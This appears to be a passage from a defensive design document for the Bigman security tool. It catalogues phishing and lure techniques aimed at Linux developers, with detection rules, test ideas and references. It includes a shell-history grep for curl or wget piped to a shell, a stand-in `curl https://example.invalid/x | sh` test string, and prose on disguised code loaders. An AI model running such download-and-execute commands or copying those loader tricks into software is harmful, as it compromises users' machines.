  - 2024-08: over 29,000 GitHub comments in three days offered `fix.zip` via MediaFire or bit.ly with password `changeme`; the payload was Lumma Stealer. https://www.bleepingcomputer.com/news/security/github-comments-abused-to-push-password-stealing-malware-masked-as-fixes/
  - Teloxide (a Rust library) maintainers reported receiving such comments.
- **What a defender inspects:** The Downloads directory for recent archives; ClamAV results; the archive's encryption flag (`bsdtar -tvf` or `unzip -l` lists without extracting).
- **Deterministic signals:**
  - On forge pages, comment links to file-hosting or shortener domains (curated list).
  - Comment text containing "password" near the link.
  - Archive names like `fix.zip` or `patch.zip`.
  - The comment author is a "first-time contributor" or new account (DOM badge).
  - A completed download from such a link is an encrypted archive. The native host can report "encrypted archive; not scanned" as incomplete, not clean.
- **Bigman today:** **Partial.** Link rules do not flag MediaFire or bit.ly. If the user enabled download scanning, the native host runs ClamAV on the completed file, but the encrypted-archive case should be explicit.
- **Proposed mitigation / detection:**
  - Extension: forge-aware `forge.comment-download` finding.
  - Native host: return `INCOMPLETE: encrypted archive` for password-protected archives.
  - The warning page shows the comment-author context.
- **Test case idea:**
  - Static forge-like HTML with a comment containing a shortener link and "password: example". Assert the finding.
  - Native-host test with a synthetic encrypted ZIP containing only a text file. Assert `INCOMPLETE`.
- **References:**
  - The BleepingComputer URL above.
  - MITRE T1204.002 https://attack.mitre.org/techniques/T1204/002/
  - Cross-reference: [malware families](./05-malware-families-and-detection.md)

### PH-10 Fake job-interview and collaboration lures
- **What it is:** Developers are contacted on LinkedIn, Telegram, Slack or Discord about a job, a paid collaboration or an investor call. They are asked to clone a take-home repository, install a "meeting" or "video" component, or fix a "camera driver" by pasting a command. The payload is a stealer or RAT; for maintainers, the real prize is registry and forge sessions.
- **Real-world examples:**
  - Contagious Interview (MITRE G1052; also DeceptiveDevelopment, DEV#POPPER) targets Windows, **Linux** and macOS. On GNOME it persists via an XDG autostart `.desktop` entry (T1547.013). https://attack.mitre.org/groups/G1052/
  - Sekoia "ClickFake Interview", 2025-03-31: fake crypto-job interview sites show a camera error with a command to paste. Windows and macOS chains were documented; Sekoia did not describe a Linux chain. https://www.sekoia.com/blog/clickfake-interview-campaign-by-lazarus
  - Binance, 2026-10-29, about $6.3 billion. Per Reuters (syndicated by NBC News), the attackers first got a wallet engineer to install a tampered coding tool from a search ad in June. In September a second engineer was interviewed by a fake HR person and a fake CEO, then downloaded a "coding assignment" repository onto his work computer. That machine and an internal AI tool were used to reach two more wallet engineers. The FBI attributes it to North Korea. https://www.nbcnews.com/business/markets/binance-hack-fake-job-interview-heist-rcna607238
  - A developer who has received these repositories all year wrote up each shape: a server error handler that fetches a paste and runs it with `new (Function.constructor)('require', …)`; the same with the address hidden as a base64 "API key" in `.env`; `.vscode/tasks.json` set to `folderOpen` with hidden output; a `.woff2` "font" of hex text decoded and run by a config file. Post: https://www.reddit.com/r/ClaudeCode/comments/1xmznwt/the_binance_theft_started_as_a_coding_assignment/ ; advisories: https://github.com/Ubuntu-Buddha/security-advisories . How Bigman covers each: [interview-repo lures](../research/interview-repo-lures.md).
  - axios, 2026-03-31: the lead maintainer was approached by someone impersonating a company founder, invited to a branded fake Slack workspace and a staged Teams meeting, and told something on his system was "out of date". The "missing item" he installed was a RAT. The attacker then published `axios@1.14.1` and `0.30.4` with a cross-platform RAT dependency. Reporting attributes it to UNC1069. Postmortem: https://github.com/axios/axios/issues/10636 ; https://socket.dev/blog/axios-maintainer-confirms-social-engineering-behind-npm-compromise
- **What a defender inspects:**
  - `~/.config/autostart/*.desktop` and `systemctl --user list-unit-files --state=enabled` (Bigman `changes` already baselines autostart and user units).
  - Recently cloned repositories' `package.json` lifecycle scripts.
  - Browser download history for "meeting SDK" or "driver" installers.
- **Deterministic signals:**
  - A page whose text combines interview or meeting vocabulary ("interview", "assessment", "camera", "microphone", "driver", "SDK", "meeting") with a terminal or paste instruction, or with an installer download.
  - A download of a script or AppImage from a domain first seen today.
  - Slack or Teams lookalike workspace domains.
- **Bigman today:** **Partial.** `bigman repo-check` (and Inspect on a folder) shows what a take-home repository runs on open: auto-run tasks (High when hidden or downloading), devcontainer commands, git hooks and config commands.
  - `bigman repo-check https://github.com/OWNER/REPO` (also GitLab, Codeberg, Bitbucket, and Inspect's URL field) reads the repository before it is cloned: git fetches the latest commit into a bare repository, so nothing is checked out or run.
  - It also reads the project's own source: `repo.code-loader` (text run with the Function constructor and `require`, or `eval` next to a fetch or decode), `repo.encoded-url`, `repo.payload-host` and `repo.disguised-asset` (a font or image that is text). See SC-24.
  - AI-tool settings shipped with the project that redirect its API traffic or approve commands for you: `repo.ai-settings`; instruction files that tell the assistant to pipe a download into a shell: `repo.instructions-run-download`.
  - A setup step that swaps a familiar command in `~/.local/bin` or `~/bin`: `persistence.shadowed-command`.
  - `bigman packages DIR` flags `package.lifecycle` and `package.script` in take-home repositories. This is npm/pnpm only; a Python take-home is not covered, see [supply-chain](./02-supply-chain-packages.md).
  - `bigman changes` would surface a new `.desktop` autostart entry.
  - `page.clickfix` does not match the "camera driver" wording (probe showed no finding).
- **Proposed mitigation / detection:**
  - Extension rule `page.fake-interview`: interview, meeting or camera vocabulary plus a paste or terminal instruction.
  - Desktop: a "new project opened" helper (`bigman packages --watch ~/src` or a GUI drop target) that inspects a cloned repo before `npm install`.
  - Guidance card: "Never run code during an interview; use a disposable VM." (Each new High repository finding now says this in its next step.)
  - Bigman `sandbox` can rehearse an installer offline.
- **Test case idea:**
  - Fixture page "Camera access failed. Update your camera driver: open Terminal and paste the command below" (no real command). Assert `page.fake-interview`.
  - A temporary repo whose `package.json` has a `postinstall` that only runs `echo`. Assert `package.lifecycle`.
- **References:**
  - The URLs above.
  - https://github.com/Ubuntu-Buddha/security-advisories
  - MITRE T1566.003, T1204.002, T1547.013 https://attack.mitre.org/techniques/T1547/013/

### PH-11 ClickFix / fake CAPTCHA "paste into terminal or Run dialog" (Linux variants)
- **What it is:** A page shows a fake CAPTCHA, browser error or "verification" step. Clicking it silently writes a command to the clipboard, and the page tells the user to open a run dialog or terminal and paste it. The user executes the attacker's command themselves, bypassing download warnings and file scanners. Windows variants dominate, but Linux and macOS variants exist; Linux lures use Alt+F2 (GNOME/KDE run dialogs) or a terminal.
- **Real-world examples:**
  - Hunt.io, 2025-05-05: an APT36-style campaign spoofing India's Ministry of Defence included a Linux branch (curl, chmod, then a shell script). It looked like a test. https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence
  - BleepingComputer, 2025-05-12: reported the Alt+F2 instruction. https://www.bleepingcomputer.com/news/security/hackers-now-testing-clickfix-attacks-against-linux-targets/
  - Microsoft, 2025-08-21, "Think before you Click(Fix)": `navigator.clipboard.writeText` usage, fake Turnstile/reCAPTCHA, iframe `postMessage` triggers. https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/
  - GitHub Scanner, 2024-09 (PH-06).
  - Hijacked Discord invites, 2025-06 (PH-16).
  - ClearFake moved from fake updates to fake CAPTCHAs in 2024–2025.
  - MITRE added T1204.004 "Malicious Copy and Paste" (created 2025-03-18). Its Linux detection analytic is "curl or wget output piped to a shell, or base64 decoding, followed by a transient file in /tmp or ~/.cache and outbound traffic". https://attack.mitre.org/techniques/T1204/004/
- **What a defender inspects:** Read-only:
  - Shell history (`grep -nE '(curl|wget)[^|]*\|\s*(ba|z)?sh' ~/.bash_history ~/.zsh_history`).
  - Recent files in `/tmp`, `/var/tmp` and `~/.cache` (`find /tmp /var/tmp ~/.cache -newermt '-1 day' -type f -perm -u+x`).
  - New autostart or user units (`bigman changes`).
  - `journalctl --user -b` for new services.
- **Deterministic signals:**
  - Page text combines verification or error wording with a run or terminal instruction and a paste instruction. Linux phrases to add: "Alt+F2", "Ctrl+Alt+T", "run dialog", "terminal", "konsole", "shell".
  - The page called `navigator.clipboard.writeText` or `document.execCommand('copy')` without a user text selection. Detectable via a MAIN-world shim.
  - The clipboard payload matches installer-inspector capability rules (`shell.download`, `shell.execute-download`, `shell.dynamic`).
  - A fake CAPTCHA widget is in a frame of a non-Cloudflare or non-Google origin. Real Turnstile and reCAPTCHA are served from `challenges.cloudflare.com` and `www.google.com/recaptcha`; a "Verify you are human" checkbox in first-party DOM is suspicious.
- **Bigman today:** **Partial.**
  - `page.clickfix` matches Win+R and "terminal" phrasing but **not Alt+F2**, as the probe showed.
  - Clipboard writes are not observed.
  - The installer inspector (`curl ... | bigman`, `bigman inspect FILE`) would classify the copied text if the user saved it, but nothing routes clipboard content there.
- **Proposed mitigation / detection:**
  - Extension:
    - extend the regex set for Linux phrases;
    - add a MAIN-world clipboard shim that records programmatic writes (payload length, hash, and the payload itself kept only in `chrome.storage.session`);
    - when `page.clickfix` fires or a programmatic write happens without a selection, send the payload to the native host op `inspect-text`, which reuses the `shell.*` rules without executing anything;
    - show the decoded command and its capability findings on the warning page, and optionally overwrite the clipboard with a harmless notice after user confirmation.
  - CLI: `bigman inspect --clipboard`, which reads `wl-paste` or `xclip -o` and runs the existing rules.
- **Test case idea:** jsdom fixture with a button whose handler writes `echo bigman-test` plus a newline to the clipboard and page text "Verify you are human, press Alt+F2 and paste". Assert `page.clickfix` and `clipboard.programmatic-write`. The native-host unit test feeds a synthetic `curl https://example.invalid/x | sh` string *as data* and asserts `shell.execute-download`.
- **References:**
  - The URLs above.
  - MITRE T1204.004
  - Cross-reference: [desktop and sandboxing](./08-desktop-and-sandboxing.md) for run-dialog hardening.

### PH-12 Clipboard hijacking of terminal commands (pastejacking, hidden text, zero-width and bidi characters)
- **What it is:** Documentation, blog posts and Q&A answers show shell commands users copy into a terminal. A malicious or compromised page can make the copied text differ from what is displayed:
  - a `copy` handler replaces the clipboard content;
  - CSS-hidden spans inside the selection get copied too;
  - zero-width or bidi-control characters alter meaning;
  - a trailing newline makes the shell execute on paste before the user can read it.
- **Real-world examples:**
  - Dylan Ayrey's "pastejacking" proof of concept, 2016-05: clipboard replaced on copy, trailing newline auto-executes. https://www.theregister.com/2016/05/25/pastejack_attack_turns_your_clipboard_into_a_vector/
  - "What you see is not what you copy" hidden-text demo, 2008, cited in the same coverage.
  - Trojan Source (Boucher and Anderson, USENIX Security 2023; CVE-2021-42574) for bidi controls. https://trojansource.codes/
  - GlassWorm (2025-10) hid code in invisible Unicode variation selectors in VS Code extensions. This is the same "invisible characters" class in code, covered in [supply-chain](./02-supply-chain-packages.md).
- **What a defender inspects:**
  - Whether the shell has bracketed paste enabled. Bash with readline 8.1+ enables it by default. A defender reads `~/.inputrc` and `/etc/inputrc` for `enable-bracketed-paste off`, and zsh config for `unset zle_bracketed_paste`.
  - Terminal emulator settings that warn on multi-line paste.
- **Deterministic signals:**
  - In a `copy` event, the final `clipboardData` text differs from `getSelection().toString()`. Use a listener at `window`, bubble phase, registered last.
  - The selection range contains nodes with computed `display:none`, `visibility:hidden`, `opacity:0`, `font-size:0`, off-screen positioning, or foreground colour equal to background.
  - The payload contains U+200B–U+200D, U+2060, U+FEFF, U+202A–U+202E, U+2066–U+2069, U+FE00–U+FE0F or U+E0100–U+E01EF.
  - The payload ends with `\n` or `\r`, or contains `;`, `&&` or `|` where the visible text did not.
- **Bigman today:** **Gap.**
- **Proposed mitigation / detection:**
  - Extension "copy guard": on mismatch or invisible characters, show a non-blocking toast with a visible rendering (escape invisible code points as `<U+200B>`) and offer "copy what I see".
  - Reuse the PH-11 native `inspect-text` for shell-capability findings.
  - CLI `bigman doctor`: an advisory row if bracketed paste is explicitly disabled in readline or zsh config. This is a read-only file check.
- **Test case idea:** jsdom fixture `<code>echo hello<span style="display:none">; echo hidden</span></code>` with a programmatic selection. Assert `clipboard.hidden-text`. A fixture string with U+200B and U+202E asserts `clipboard.invisible-chars`. Payloads contain only `echo`.
- **References:**
  - https://www.theregister.com/2016/05/25/pastejack_attack_turns_your_clipboard_into_a_vector/
  - https://trojansource.codes/
  - https://www.unicode.org/reports/tr39/
  - MITRE T1204.004

### PH-13 Malicious QR codes (quishing)
- **What it is:** A QR code in an email, PDF, conference slide, sticker or web page encodes a phishing URL. Mail and web filters often do not decode images. A phone scan also moves the victim to a device with weaker protections. For Linux desktop users the exposure is smaller but real, through PDFs and web pages.
- **Real-world examples:** FBI IC3 PSA I-011822-PSA, 2022-01-18, "Cybercriminals Tampering with QR Codes to Steal Victim Funds". https://www.ic3.gov/PSA/2022/PSA220118
- **What a defender inspects:** QR images in suspicious PDFs (Bigman PDF triage already lists link annotations; QR images are not decoded). The decoded URL, checked against the same rules as links.
- **Deterministic signals:** Large square high-contrast `img` or `canvas` elements, or PDF images, that decode as QR; the decoded URL's `analyzeLink` result. Decoding is deterministic, using a vendored pure-JS QR decoder.
- **Bigman today:** **Gap.**
- **Proposed mitigation / detection:**
  - Extension: an on-demand "check QR codes on this page" action in the popup. Do not decode every image automatically, for performance and privacy.
  - Desktop: `bigman inspect image.png` decodes QR codes (e.g. via `zbarimg` if installed, sandboxed under Bubblewrap like other parsers) and runs the URL rules.
- **Test case idea:** A generated PNG QR encoding `https://pypj.example/login`. Assert the decoded URL and a `domain.*` finding.
- **References:**
  - https://www.ic3.gov/PSA/2022/PSA220118
  - MITRE T1566 https://attack.mitre.org/techniques/T1566/

### PH-14 Browser-in-the-browser fake login windows
- **What it is:** A malicious page draws a fake pop-up window with HTML and CSS: title bar, padlock and an address bar reading `https://accounts.google.com` or `github.com`. Inside it is an attacker-controlled login form. The "URL" users are told to check is just page pixels. "Sign in with GitHub/Google" flows on developer tool sites make the pop-up expected.
- **Real-world examples:**
  - mr.d0x, 2022-03-15, published technique and templates. https://mrd0x.com/browser-in-the-browser-phishing-attack/
  - Kaspersky, 2026-03-04: BitB used in real phishing; a Facebook campaign showed a fake in-page login window with a forged facebook.com address bar after a fake CAPTCHA. https://www.kaspersky.com/blog/browser-in-the-browser-phishing-facebook/55374/
- **What a defender inspects:** Whether the "window" can be dragged outside the browser (a real pop-up is a separate OS window); whether the password manager offers autofill.
- **Deterministic signals:**
  - An element (often containing an `iframe`) positioned `fixed` or `absolute`, with child text that looks like a URL bar: a hostname string matching a protected brand plus a lock glyph or SVG, plus a password field inside, on a non-canonical origin.
  - `window.open` was **not** called. Real OAuth pop-ups are new windows, which the MAIN-world shim can see.
- **Bigman today:** **Gap**, except that if the page's own domain is a lookalike it may be flagged by `domain.*`.
- **Proposed mitigation / detection:** Extension rule `page.fake-window`: a brand hostname rendered as text inside a positioned overlay that contains a password input, where the page origin is non-canonical. It shares the identity check with the PH-05 credential guard.
- **Test case idea:** A jsdom fixture with a fixed-position div containing the text "https://github.com/login", a lock SVG and `input[type=password]`, served from `https://example.invalid`. Assert the finding.
- **References:**
  - https://mrd0x.com/browser-in-the-browser-phishing-attack/
  - https://www.kaspersky.com/blog/browser-in-the-browser-phishing-facebook/55374/
  - MITRE T1056.003 https://attack.mitre.org/techniques/T1056/003/

### PH-15 Fake update prompts (browser, conferencing, driver, "missing component")
- **What it is:** A compromised or malicious site shows a full-page "your browser is out of date", "Teams/Zoom SDK missing" or "driver update required" banner. It offers a download or a command. The fake update families are mostly Windows and macOS, but the same social pattern reached a Linux-using maintainer through a fake meeting (axios, 2026).
- **Real-world examples:**
  - ClearFake (since 2023-07) on compromised WordPress sites, with payloads stored on the BNB Smart Chain ("EtherHiding"). It moved to fake CAPTCHA lures in 2024–2025; Sekoia reported about 9,300 infected sites in early 2025. https://thehackernews.com/2025/03/clearfake-infects-9300-sites-uses-fake.html
  - SocGholish/FakeUpdates (TA569) since about 2018.
  - axios postmortem, 2026: "something on his system was out of date", the "missing item" was a RAT. https://github.com/axios/axios/issues/10636
- **What a defender inspects:** Downloads of installers or scripts with "update" in the name from non-vendor origins; package-manager logs (`/var/log/dnf.rpm.log`, `/var/log/apt/history.log`) for whether a real update happened; new autostart entries.
- **Deterministic signals:**
  - Page text with update wording ("browser is out of date", "update required", "missing plugin/SDK/driver") on an origin that is not the vendor's.
  - A download triggered from such a page.
  - Linux reality check: Chrome/Chromium and Firefox on Linux update through the package manager or Flatpak, never through a web download. That makes "download this browser update" on Linux a near-certain red flag the warning page can state plainly.
- **Bigman today:** **Partial.**
  - Completed-download scanning (ClamAV via native host, opt-in).
  - `bigman inspect` for scripts.
  - `bigman sandbox` rehearsal.
  - No page-level fake-update rule.
- **Proposed mitigation / detection:**
  - Extension `page.fake-update` rule.
  - Tag downloads started from pages with `page.*` findings, so the native-host scan result and notification include "this file was offered as an update by a page Bigman flagged".
  - The warning page explains how updates actually arrive on the user's distro.
- **Test case idea:** Fixture page "Your Chrome is out of date. Download the update" with a link to `/update.sh` on `https://example.invalid`. Assert `page.fake-update`. Simulate a download event and assert that the queued job carries the page finding.
- **References:**
  - The URLs above.
  - MITRE T1189 https://attack.mitre.org/techniques/T1189/ and T1036 https://attack.mitre.org/techniques/T1036/
  - Cross-reference: [malware families](./05-malware-families-and-detection.md)

### PH-16 Chat-platform link spam and invite hijacking aimed at OSS communities
- **What it is:** OSS projects run Discord, Slack, Matrix and Telegram communities. Attackers DM members, post "giveaway", "airdrop" or "verify" links, build fake branded workspaces, or take over expired or deleted invite links published in project READMEs. Desktop chat clients (Electron) open links in the default browser, so the browser extension still sees the final page but not the context.
- **Real-world examples:**
  - Check Point Research, 2025-06-12: expired or deleted Discord invite codes were re-registered as vanity invites. Old links on websites and forums then led to attacker servers, where a fake "Safeguard" verification bot led to a ClickFix page (Windows payloads). https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
  - axios, 2026: a branded fake Slack workspace with fake team profiles (PH-10).
  - Contagious Interview uses LinkedIn and Telegram first contact (MITRE G1052).
- **What a defender inspects:** Project README and website invite links. Maintainers should check that they are permanent and still resolve to the project's server. Members' reports of "verify" bots.
- **Deterministic signals:**
  - Pages reached from `discord.com`, `discord.gg`, Slack or Matrix web clients (`document.referrer`) that contain verification or ClickFix wording.
  - On web chat clients, links whose text and destination differ (PH-01) and shorteners (PH-19).
  - For maintainers: a `bigman` CLI check of invite links in the repo's README, comparing the invite's server name with the expected one. This needs a network request and must be opt-in.
- **Bigman today:** **Partial.** The extension runs on web chat clients, so all link rules apply. Desktop chat apps and invite hijacking are not covered. A hijacked `discord.gg` invite is canonical and produces no finding.
- **Proposed mitigation / detection:**
  - Extension: "arrived from chat" context, so `page.clickfix` and `page.fake-update` severity is raised when the referrer is a chat platform.
  - Docs/guidance for maintainers: use permanent invites; the warning page links to the platform's guidance.
- **Test case idea:** jsdom page with `document.referrer` set to `https://discord.com/channels/...` plus ClickFix wording. Assert the raised severity field.
- **References:**
  - https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
  - https://attack.mitre.org/groups/G1052/
  - MITRE T1566.003

### PH-17 Search-ad and SEO poisoning of Linux software download pages
- **What it is:** Users search "install homebrew", "download <tool> linux" or "<tool> .deb" and click a sponsored result or a poisoned organic result. The page imitates the project site and offers a tampered package or a `curl | bash` one-liner. Sometimes a legitimate project site is itself compromised to redirect some Linux visitors.
- **Real-world examples:**
  - 2025-01: Google ads showed `brew.sh` but led to `brewe.sh`, whose install one-liner delivered AMOS stealer (macOS; Linux users of Homebrew were exposed to the same lure). https://www.bleepingcomputer.com/news/security/fake-homebrew-google-ads-target-mac-users-with-malware/
  - Kaspersky, 2023-09-12: the official Free Download Manager site sometimes redirected Linux downloads (2020–2022) to `deb.fdmpkg[.]org`, serving a backdoored `.deb` that installed `/etc/cron.d/collect`. https://securelist.com/backdoored-free-download-manager-linux-malware/110465/
  - JFrog, 2024: about 215k Docker Hub "Website SEO" spam repositories (PH-18).
- **What a defender inspects:**
  - Installed packages not from configured repositories: `rpm -qa --qf '%{NAME} %{VENDOR} %{PACKAGER}\n'`, `apt-mark showmanual`, `dpkg -l` vs `apt policy`.
  - `/etc/cron.d/` and `/var/tmp` for unexpected executables (FDM indicators).
  - `bigman changes` for new cron entries (`/etc/cron.d` is baselined).
- **Deterministic signals:**
  - The page shows a shell install command (a `pre` or `code` block containing a download piped to a shell) while the origin is not in an "official install origins" list for that tool.
  - The page title or h1 names a known project, but the origin is non-canonical (the brand pack from PH-02).
  - Ad-click URL patterns (`/aclk?`, `gclid=`) in the navigation chain.
  - A `.deb`, `.rpm`, `.AppImage` or `.run` download from an origin that is not the project's documented download host.
- **Bigman today:** **Gap** in the browser: `brewe.sh` returned `none`. **Partial** on the desktop:
  - `bigman inspect URL` statically classifies an install script (`shell.download`, `shell.privilege`, `shell.persistence`);
  - download scanning can scan `.deb` files with ClamAV;
  - `bigman changes` detects `/etc/cron.d` additions.
- **Proposed mitigation / detection:**
  - Extension: bundled "official origins" data for the top Linux tools that users install via one-liners or direct downloads (Homebrew, rustup, nvm, Docker, VS Code, Chrome, Zoom, Slack, Discord, Signal, Brave, Tailscale, Ollama, k3s, Node, Deno, Bun, uv, Poetry, etc.). Each entry is a tool name with its canonical install hostnames, curated by hand and reviewed.
  - Rule `page.install-command-offsite`.
  - The warning page offers "Inspect this command with Bigman" (native `inspect-text`) and links to the official install page.
  - Cross-reference: [distro packaging](./03-distro-packaging-and-install-channels.md) for `curl | bash` hardening.
- **Test case idea:** Fixture page titled "Homebrew — The Missing Package Manager" at `https://brewe.example/` with a `pre` block containing a placeholder one-liner. Assert `page.install-command-offsite`. The same fixture at `https://brew.sh/` gives no finding.
- **References:**
  - The URLs above.
  - MITRE T1583.008 https://attack.mitre.org/techniques/T1583/008/ and T1608.006 https://attack.mitre.org/techniques/T1608/006/

### PH-18 Fake IDE-extension, container-image and package pages
- **What it is:** Developer marketplaces host user-generated pages: VS Code Marketplace, Open VSX, Docker Hub, PyPI and npm READMEs, Flathub and Snapcraft. Attackers publish lookalike extensions (same display name and icon, different publisher), imageless Docker Hub "repositories" used purely as SEO and phishing landing pages, and READMEs with download links. The browser sees a canonical domain, so the deception is in the *namespace*, not the hostname.
- **Real-world examples:**
  - JFrog, 2024-04-30: about 4.6M imageless Docker Hub repositories, about 2.81M tied to Downloader, eBook-phishing and SEO campaigns using 208,739 fake accounts. Docker removed them and stopped external links on imageless repo pages. https://jfrog.com/blog/attacks-on-docker-with-millions-of-malicious-repositories-spread-malware-and-phishing-scams/
  - GlassWorm, 2025-10: compromised and malicious Open VSX and VS Code extensions with invisible-Unicode payloads; it re-emerged 2025-11. https://www.bleepingcomputer.com/news/security/glassworm-malware-returns-on-openvsx-with-3-new-vscode-extensions/ (deep coverage belongs to [supply-chain](./02-supply-chain-packages.md))
- **What a defender inspects:**
  - Installed extension IDs and publishers: `code --list-extensions --show-versions`, `~/.vscode/extensions/`, `~/.vscode-oss/extensions/`.
  - Pulled images and their origin: `podman images --digests`, `docker images --digests`.
- **Deterministic signals:**
  - On marketplace pages, publisher ID vs display name: the display name matches a top extension, but the publisher is not that extension's known publisher (needs a small curated table).
  - Docker Hub page with no tags or images but external links in the description.
  - README download links to non-forge hosts.
- **Bigman today:** **Gap.** There are no marketplace or registry brand entries and no namespace awareness. `bigman packages` covers npm and pnpm only.
- **Proposed mitigation / detection:**
  - Extension "namespace lookalike" rules for `marketplace.visualstudio.com/items?itemName=`, `open-vsx.org/extension/`, `hub.docker.com/r/` and `pypi.org/project/`. Compare against a curated top-N list with Levenshtein and confusable skeleton checks, in the same engine as domains.
  - Desktop: a read-only `bigman doctor` inventory of VS Code / VSCodium extensions with publisher IDs.
- **Test case idea:** URL-only unit tests: `itemName=ms-pythom.python` gives `review` against `ms-python.python`; `hub.docker.com/r/library/nginx` vs `hub.docker.com/r/library-nginx/nginx`.
- **References:**
  - The URLs above.
  - MITRE T1036.005 https://attack.mitre.org/techniques/T1036/005/

### PH-19 URL shorteners and multi-hop redirect chains
- **What it is:** Shorteners (bit.ly and similar) and multi-hop tracking chains hide the destination from users and from link-text comparison. Attackers also rotate the final hop or cloak it, showing scanners a benign page. The Lumma GitHub-comment campaign used bit.ly alongside MediaFire.
- **Real-world examples:**
  - 2024-08 GitHub comments (PH-09).
  - JFrog's Docker Hub Downloader campaign used fake shorteners before switching to open redirects (PH-04).
  - Oest et al. (PhishTime, USENIX Security 2020) show that blacklists are slow against evasive, cloaked phishing.
- **What a defender inspects:** The resolved destination, obtained from a non-rendering, bounded, read-only HEAD/GET redirect walk. Bigman's installer fetcher already does DNS pinning and redirect checks.
- **Deterministic signals:** Registrable domain in a curated shortener list. Redirect count and cross-domain hops when resolved by the native host. A final-hop domain that fails `analyzeLink`.
- **Bigman today:** **Gap.** `bit.ly` returned `none`. The background script exposes a native `inspect-url` op only to extension pages, which could be reused.
- **Proposed mitigation / detection:**
  - Extension: rule `url.shortener` at `info` level, raised to `review` inside forge comments or chat pages.
  - The warning page has a "Resolve destination" button that calls native `inspect-url` with a redirect-only mode: no body rendering, at most N hops, the existing size and time bounds. It shows each hop and runs `analyzeLink` on every hop.
  - The resolution is only performed after the user clicks, so there is no telemetry by default.
- **Test case idea:** Native-host integration test against a local HTTP test server with three redirects to `pypj.localtest` (a test hostname). Assert hop listing and a `domain.typo` finding on the last hop.
- **References:**
  - https://www.usenix.org/conference/usenixsecurity20/presentation/oest-phishtime
  - https://www.bleepingcomputer.com/news/security/github-comments-abused-to-push-password-stealing-malware-masked-as-fixes/

### PH-20 `data:`, `javascript:`, `blob:` and `file:` URLs and HTML attachments
- **What it is:** Links using `data:` or `blob:` render attacker HTML with no meaningful hostname. `javascript:` runs code in the current page. Downloaded `.html` or `.svg` attachments open as `file:` URLs and show credential forms locally, avoiding URL reputation entirely. Chromium blocks *page-initiated* top-frame `data:` navigations; the 2017 blink-dev intent cited spoofing and phishing. `blob:` URLs and local HTML files remain usable.
- **Real-world examples:**
  - Chromium blink-dev "Intent to Deprecate and Remove: top-frame navigations to data URLs" (2017). https://groups.google.com/a/chromium.org/g/blink-dev/c/GbVcuwg_QjM
  - HTML-attachment phishing is a long-running mail technique (MITRE T1566.001). No specific 2024–2026 Linux-targeted incident was verified this session.
- **What a defender inspects:** Recent `.html`, `.htm`, `.svg` and `.shtml` files in `~/Downloads`. Their contents can be grepped read-only for `<form`, `type="password"` and external `action=` targets.
- **Deterministic signals:**
  - Scheme is `data:`, `javascript:`, `blob:`, `filesystem:` or `file:`.
  - For local HTML: the presence of password inputs and a form `action` pointing to a remote host.
  - SVG files containing `<script>` or `<foreignObject>` with forms.
- **Bigman today:** **Partial.**
  - `url.active` flags `javascript:`, `data:` and `file:`.
  - The background `warn` handler refuses to open non-http(s) URLs and notifies the user.
  - `blob:` returns `unavailable` and is not blocked at click.
  - Local HTML or SVG downloads are scanned only by ClamAV.
- **Proposed mitigation / detection:**
  - Add `blob:` and `filesystem:` to `url.active`.
  - Native host: a deterministic `html.credential-form` and `svg.active-content` rule for downloaded `.html` and `.svg` files (static parse, no rendering).
  - `bigman scan` can apply the same rule.
- **Test case idea:** A synthetic local HTML file with a password field and `action="https://example.invalid/collect"`. Assert `html.credential-form`. A synthetic SVG with an inert `<script>` comment block asserts `svg.active-content`.
- **References:**
  - https://groups.google.com/a/chromium.org/g/blink-dev/c/GbVcuwg_QjM
  - MITRE T1566.001 https://attack.mitre.org/techniques/T1566/001/

### PH-21 Userinfo and target-embedding URLs (`github.com@...`, `github.com.evil.tld`)
- **What it is:** URL syntax lets a misleading string appear first. `https://github.com@evil.tld/` puts "github.com" in the userinfo part. `https://github.com.evil.tld/` and `https://github.com-login.evil.tld/` embed the brand as a subdomain or label prefix. Users read left to right and stop at the brand. Chromium's lookalike documentation lists "target embedding" as a category.
- **Real-world examples:**
  - `github.rustfoundation.dev` (crates.io phishing, 2025-09).
  - Chromium lookalike documentation: https://chromium.googlesource.com/chromium/src/+/main/docs/security/lookalikes/lookalike-domains.md
  - Reynolds et al. (CHI 2020) measured how users misread URL structure.
- **What a defender inspects:** The full hostname in history; for userinfo URLs, the part after the last `@`.
- **Deterministic signals:** `URL.username` or `URL.password` is non-empty. A hostname whose non-registrable labels contain a protected brand or a full canonical domain string.
- **Bigman today:** **Covered** for brands in the list. `url.userinfo` and `domain.brand` (subdomain match) fire, as the probe showed for `github.com.evil.example`, `npmjs.com.co` and `github.rustfoundation.dev`.
- **Proposed mitigation / detection:** Keep the rules. Extend them to the PH-02 and PH-18 brand packs. Also match full canonical domain strings embedded with hyphens (`github-com-login`).
- **Test case idea:** Existing Jest style: `https://github.com@example.invalid/` gives `url.userinfo`; `https://pypi.org.example.invalid/` gives `domain.brand` once the brand pack is added.
- **References:**
  - The Chromium lookalike doc above.
  - https://doi.org/10.1145/3313831.3376298
  - MITRE T1036

## Defensive data sources and feeds (license and redistribution)

All terms below were read on 2026-10-29 unless marked. "Bundle" means shipping the data inside Bigman releases. "User import" means the user downloads the data under their own account or terms and loads it through the extension's existing import (at most 20,000 entries and 2 MiB today).

| Source | URL | License / terms (as read) | Bundle in Bigman? | Local import? | Notes |
|---|---|---|---|---|---|
| Google Safe Browsing (v4 Update API; v5 also listed) | https://developers.google.com/safe-browsing/terms , https://developers.google.com/safe-browsing/v4/usage-limits | Non-commercial use only unless there is a separate agreement; commercial users are pointed to Web Risk. Warnings must say reliability "cannot be guaranteed". A URL must not be treated as unsafe unless updates were received from Google within the past 30 minutes. | No. The data comes via the API, and the 30-minute freshness rule implies continuous network sync. | Only as an opt-in, per-user API key mode. Hash-prefix lookups send prefixes to Google on a match. | Conflicts with Bigman's "no remote reputation by default" stance. Chrome already applies GSB itself, so duplicating it adds little. |
| PhishTank (Cisco Talos) | https://www.phishtank.com/developer_info.php | Terms link to a Cisco EULA. Historical site footer: CC BY-SA 2.5. **New registrations "temporarily disabled"** (checked 2026-10-29). Downloads without an app key are "limited to a few downloads per day". | Not recommended. The EULA has not been reviewed and the share-alike status is unclear. | Yes, by users who already have a key. Bigman stores and matches only. | Coverage has declined; treat it as supplementary. |
